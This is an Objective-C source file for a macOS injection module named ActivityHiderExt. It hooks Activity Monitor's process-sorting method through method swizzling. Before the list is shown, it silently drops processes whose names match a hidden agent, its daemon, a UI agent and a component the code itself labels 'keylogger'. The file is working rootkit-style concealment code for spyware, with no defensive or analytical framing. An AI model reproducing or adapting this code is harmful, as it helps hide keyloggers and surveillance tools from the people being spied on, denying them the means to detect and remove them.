//
//  FinderInj.m
//  FinderMenu
//
//  Created by Alexey Zhuchkov on 10/21/12.
//  Copyright (c) 2012 InfiniteLabs. All rights reserved.
//

#import "ActivityHiderExt.h"

// Hook Object C
#import <objc/message.h>

@implementation ActivityHiderExt

static NSString * appName       = @"blblu";
static NSString * appDeamonName = @"blbld";
static NSString * userAgentUI   = @"UserActivityMonitorAgentUI";
static NSString * keylogger     = @"kbls";

static ActivityHiderExt *_instance = nil;
static IMP methodIMP = NULL;


+ (void)load {
//    NSLog(@"#### Loaded");
    if (!_instance) {
       _instance = [[ActivityHiderExt alloc] init];
    }
}
- (id)init{
//    NSLog(@"#### inited");
    self = [super init];
    if (self) {
        [self startHookObjectC];
    }
    return self;
}

- (void)startHookObjectC{
    Method originalMeth ;
    Method replacementMeth;
    
    Class originalClass = NSClassFromString(@"SMProcessController");

    originalMeth = class_getInstanceMethod(originalClass, @selector(_sortProcessArray:));
    methodIMP = method_getImplementation(originalMeth);

    replacementMeth = class_getInstanceMethod(NSClassFromString(@"ActivityHiderExt"), @selector(Patcher_sortProcessArray:));
    method_exchangeImplementations(originalMeth, replacementMeth);
}

-(void) Patcher_sortProcessArray:(id)Sender1 {
    NSMutableArray * indexed = [[NSMutableArray alloc]init];
    for (int i=0; i < [Sender1 count]; i++) {
         NSString * hijack = [NSString stringWithFormat:@"%@",[Sender1 objectAtIndex:i]];
         if ([hijack rangeOfString:appName].location != NSNotFound       ||
             [hijack rangeOfString:appDeamonName].location != NSNotFound ||
             [hijack rangeOfString:userAgentUI].location != NSNotFound   ||
             [hijack rangeOfString:keylogger].location != NSNotFound ){
             
             [indexed addObject:[Sender1 objectAtIndex:i]];
         }
    }
    if ([indexed count] > 0) {
        for (int i=0; i < [indexed count]; i++) {
            [Sender1 removeObject:[indexed objectAtIndex:i]];
        }
    }
    [indexed release];

    methodIMP(self, @selector(_sortProcessArray:), Sender1);
}

@end
